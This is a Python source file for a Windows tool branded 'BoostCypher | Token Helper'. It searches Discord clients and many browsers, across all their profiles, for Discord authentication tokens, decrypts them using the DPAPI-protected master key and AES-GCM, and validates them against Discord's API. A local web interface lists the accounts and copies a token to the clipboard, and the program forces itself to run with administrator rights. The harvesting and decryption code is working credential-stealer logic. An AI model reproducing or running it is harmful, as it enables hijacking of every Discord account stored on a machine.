import base64
import ctypes
import json
import os
import re
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Dict, List, Optional, Union

import httpx
import pyclip
import webview
from Crypto.Cipher import AES
from Crypto.Cipher._mode_gcm import GcmMode
from flask import Flask, jsonify, render_template, request
from win32crypt import CryptUnprotectData

from windowfix import setup_all_windows_borderless


class Discord:
    def __init__(self):
        self.roaming_path: str = os.getenv("APPDATA")
        self.appdata_path: str = os.getenv("LOCALAPPDATA")
        self.local_storage_paths: Dict[str, str] = {
            "discord": self.roaming_path + "\\discord\\Local Storage\\leveldb\\",
            "discordcanary": self.roaming_path
            + "\\discordcanary\\Local Storage\\leveldb\\",
            "lightcord": self.roaming_path + "\\Lightcord\\Local Storage\\leveldb\\",
            "discordptb": self.roaming_path + "\\discordptb\\Local Storage\\leveldb\\",
            "vesktop": self.roaming_path + "\\Vesktop\\Local Storage\\leveldb\\",
            "equibop": self.roaming_path + "\\equibop\\Local Storage\\leveldb\\",
            "opera": self.roaming_path
            + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\",
            "operagx": self.roaming_path
            + "\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\",
            "firefox": self.roaming_path + "\\Mozilla\\Firefox\\Profiles",
            "amigo": self.appdata_path + "\\Amigo\\User Data\\Local Storage\\leveldb\\",
            "torch": self.appdata_path + "\\Torch\\User Data\\Local Storage\\leveldb\\",
            "kometa": self.appdata_path
            + "\\Kometa\\User Data\\Local Storage\\leveldb\\",
            "orbitum": self.appdata_path
            + "\\Orbitum\\User Data\\Local Storage\\leveldb\\",
            "centbrowser": self.appdata_path
            + "\\CentBrowser\\User Data\\Local Storage\\leveldb\\",
            "7star": self.appdata_path
            + "\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\",
            "sputnik": self.appdata_path
            + "\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\",
            "vivaldi": self.appdata_path
            + "\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\",
            "chromesxs": self.appdata_path
            + "\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\",
            "chrome": self.appdata_path
            + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\",
            "epicprivacybrowser": self.appdata_path
            + "\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\",
            "microsoftedge": self.appdata_path
            + "\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\",
            "uran": self.appdata_path
            + "\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\",
            "yandex": self.appdata_path
            + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\",
            "brave": self.appdata_path
            + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\",
            "iridium": self.appdata_path
            + "\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\",
        }

    def resolve_local_storage_path(self, platform: str) -> Optional[str]:
        if platform not in ["vesktop", "equibop"]:
            return self.local_storage_paths[platform]

        candidates: List[str] = [
            os.path.join(
                self.roaming_path,
                platform,
                "sessionData",
                "Local Storage",
                "leveldb",
            ),
            os.path.join(
                self.roaming_path,
                platform,
                "Local Storage",
                "leveldb",
            ),
            os.path.join(
                self.appdata_path,
                platform,
                "sessionData",
                "Local Storage",
                "leveldb",
            ),
            os.path.join(
                self.appdata_path,
                platform,
                "Local Storage",
                "leveldb",
            ),
        ]

        for candidate in candidates:
            if os.path.exists(candidate):
                return candidate

        return None

    def validate_token(self, token: str) -> Optional[Dict[str, Union[str, bool]]]:
        try:
            url: str = "https://discord.com/api/v9/users/@me"
            headers: Dict[str, str] = {"Authorization": token}

            # Use timeout to fail fast instead of hanging
            r: httpx.Response = httpx.get(url, headers=headers, timeout=5.0)

            if r.status_code != 200 and not token.startswith("MT"):
                headers["Authorization"] = f"MT{token}"
                r = httpx.get(url, headers=headers, timeout=5.0)

                if r.status_code != 200:
                    return None

            elif r.status_code != 200:
                return None

            response: Dict[str, Union[str, bool]] = dict(r.json())
            response["token"] = token

            return response
        except:
            return None

    def get_token(self, content: str, decryption_key: bytes) -> Optional[str]:
        """Extract encrypted token from content. Returns decrypted token string or None."""
        for line in content.split("\n"):
            for match in re.findall(r"dQw4w9WgXcQ:[^\"]*", line):
                try:
                    encrypted_token: bytes = base64.b64decode(match.split(":")[1])
                    iv: bytes = encrypted_token[3:15]
                    payload: bytes = encrypted_token[15:]
                    cipher: GcmMode = AES.new(decryption_key, AES.MODE_GCM, iv)
                    decrypted_token: str = cipher.decrypt(payload)[:-16].decode()
                    return decrypted_token
                except:
                    continue
        return None

    def get_accounts(self) -> Dict[str, Dict[str, Union[str, bool]]]:
        discord_accounts: Dict[str, Dict[str, Union[str, bool]]] = {}
        tokens_to_validate: List[str] = []
        seen_tokens: set = set()

        # First pass: collect all tokens from all locations
        for platform, path in self.local_storage_paths.items():
            resolved_path: Optional[str] = self.resolve_local_storage_path(platform)

            if resolved_path is None or not os.path.exists(resolved_path):
                continue

            path = resolved_path

            # handle discord clients
            if "cord" in platform or platform in ["vesktop", "equibop"]:
                local_state_path: str = os.path.join(
                    os.path.dirname(os.path.dirname(path)),
                    "Local State",
                )

                if not os.path.isfile(local_state_path):
                    continue
                else:
                    try:
                        with open(local_state_path, "r", encoding="utf-8") as f:
                            content: str = f.read()
                            encrypted_decryption_key: str = json.loads(content)[
                                "os_crypt"
                            ]["encrypted_key"]
                            decryption_key: bytes = CryptUnprotectData(
                                base64.b64decode(encrypted_decryption_key)[5:]
                            )[1]
                    except:
                        continue

                # Collect all tokens from Local Storage
                for file in os.listdir(path):
                    if not file.endswith(".log") and not file.endswith(".ldb"):
                        continue

                    try:
                        with open(os.path.join(path, file), "r", errors="ignore") as f:
                            content: str = f.read()

                            # Collect encrypted tokens
                            for match in re.findall(r"dQw4w9WgXcQ:[^\"]*", content):
                                try:
                                    encrypted_token: bytes = base64.b64decode(
                                        match.split(":")[1]
                                    )
                                    iv: bytes = encrypted_token[3:15]
                                    payload: bytes = encrypted_token[15:]
                                    cipher: GcmMode = AES.new(
                                        decryption_key, AES.MODE_GCM, iv
                                    )
                                    decrypted_token: str = cipher.decrypt(payload)[
                                        :-16
                                    ].decode()
                                    if decrypted_token not in seen_tokens:
                                        tokens_to_validate.append(decrypted_token)
                                        seen_tokens.add(decrypted_token)
                                except:
                                    pass

                            # Collect plain Discord tokens
                            for token in re.findall(
                                r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", content
                            ):
                                if token not in seen_tokens:
                                    tokens_to_validate.append(token)
                                    seen_tokens.add(token)
                    except:
                        pass

                # For equibop/vesktop, also collect from Cache and IndexedDB
                if platform in ["equibop", "vesktop"]:
                    session_data_path: str = os.path.dirname(os.path.dirname(path))

                    # Search Cache_Data directory
                    cache_data_path: str = os.path.join(
                        session_data_path, "Cache", "Cache_Data"
                    )
                    if os.path.exists(cache_data_path):
                        try:
                            for file in os.listdir(cache_data_path):
                                if not file.startswith("f_"):
                                    continue
                                try:
                                    with open(
                                        os.path.join(cache_data_path, file),
                                        "r",
                                        errors="ignore",
                                    ) as f:
                                        content: str = f.read()
                                        for token in re.findall(
                                            r"MTk[A-Za-z0-9_-]{20,}\.[\w-]{6}\.[\w-]{25,110}",
                                            content,
                                        ):
                                            if token not in seen_tokens:
                                                tokens_to_validate.append(token)
                                                seen_tokens.add(token)
                                except:
                                    pass
                        except:
                            pass

                    # Search IndexedDB directory
                    indexed_db_path: str = os.path.join(
                        session_data_path,
                        "IndexedDB",
                        "https_discord.com_0.indexeddb.leveldb",
                    )
                    if os.path.exists(indexed_db_path):
                        try:
                            for file in os.listdir(indexed_db_path):
                                if not file.endswith(".log") and not file.endswith(
                                    ".ldb"
                                ):
                                    continue
                                try:
                                    with open(
                                        os.path.join(indexed_db_path, file),
                                        "r",
                                        errors="ignore",
                                    ) as f:
                                        content: str = f.read()
                                        for token in re.findall(
                                            r"MTk[A-Za-z0-9_-]{20,}\.[\w-]{6}\.[\w-]{25,110}",
                                            content,
                                        ):
                                            if token not in seen_tokens:
                                                tokens_to_validate.append(token)
                                                seen_tokens.add(token)
                                except:
                                    pass
                        except:
                            pass

            # handle firefox
            elif "firefox" in platform:
                try:
                    for _path, _, files in os.walk(path):
                        for file in files:
                            if not file.endswith(".sqlite"):
                                continue

                            try:
                                with open(
                                    f"{_path}\\{file}", "r", errors="ignore"
                                ) as f:
                                    content: str = f.read()

                                    for token in re.findall(
                                        r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", content
                                    ):
                                        if token not in seen_tokens:
                                            tokens_to_validate.append(token)
                                            seen_tokens.add(token)
                            except:
                                pass
                except:
                    pass

            # handle chromium based browsers
            else:
                try:
                    if "User Data\\Default" in path:
                        profiles: List[str] = ["Default"]

                        user_data_path: str = (
                            path.split("User Data\\")[0] + "User Data\\"
                        )
                        for file in os.listdir(user_data_path):
                            if file.startswith("Profile"):
                                profiles.append(file)

                        for profile in profiles:
                            try:
                                for _path, _, files in os.walk(
                                    f"{user_data_path}{profile}\\Local Storage\\leveldb\\"
                                ):
                                    for file in files:
                                        if not file.endswith(
                                            ".log"
                                        ) and not file.endswith(".ldb"):
                                            continue

                                        try:
                                            with open(
                                                f"{_path}{file}", "r", errors="ignore"
                                            ) as f:
                                                content: str = f.read()

                                                for token in re.findall(
                                                    r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}",
                                                    content,
                                                ):
                                                    if token not in seen_tokens:
                                                        tokens_to_validate.append(token)
                                                        seen_tokens.add(token)
                                        except:
                                            pass
                            except:
                                pass
                except:
                    pass

        # Second pass: validate all tokens in parallel
        if tokens_to_validate:
            with ThreadPoolExecutor(max_workers=5) as executor:
                futures = {
                    executor.submit(self.validate_token, token): token
                    for token in tokens_to_validate
                }

                for future in as_completed(futures):
                    try:
                        data = future.result()
                        if data != None and data["id"] not in discord_accounts:
                            discord_accounts[data["id"]] = data
                    except:
                        pass

        return discord_accounts


class Api:
    def __init__(self):
        self._window = None

    def set_window(self, window):
        self._window = window

    def quit(self):
        self._window.destroy()


app: Flask = Flask(__name__, template_folder="ui")
quit_event: threading.Event = threading.Event()


@app.route("/", methods=["GET"])
def index() -> str:
    return render_template("index.html")


@app.route("/quit", methods=["GET"])
def quit() -> str:
    parameters: Dict[str, str] = request.args

    api.quit()

    copy: Optional[str] = parameters.get("copy")
    if copy != "null":
        pyclip.copy(copy)
        ctypes.windll.user32.MessageBoxW(
            0,
            "The token was successfully copied to your clipboard.",
            "BoostCypher | Token Helper",
            0,
        )

    return "1"


@app.route("/get_accounts", methods=["GET"])
def get_accounts() -> str:
    discord: Discord = Discord()
    accounts: Dict[str, Dict[str, Union[str, bool]]] = discord.get_accounts()

    return jsonify(accounts)


def flask() -> None:
    while not quit_event.is_set():
        app.run(port=3801, use_reloader=False)


if __name__ == "__main__":
    # force admin to access local storage if program runtime is blocking it
    if not ctypes.windll.shell32.IsUserAnAdmin():
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable, " ".join(sys.argv), None, 1
        )
        os._exit(0)

    threading.Thread(target=flask, daemon=True).start()

    api: Api = Api()
    window = webview.create_window(
        "BoostCypher | Token Helper",
        "http://127.0.0.1:3801",
        width=800,
        height=500,
        resizable=False,
        easy_drag=True,
        background_color="#0e0e13",
        frameless=True,
        js_api=Api(),
    )
    api.set_window(window)

    window.events.shown += setup_all_windows_borderless

    webview.start()
    quit_event.set()
    time.sleep(3)
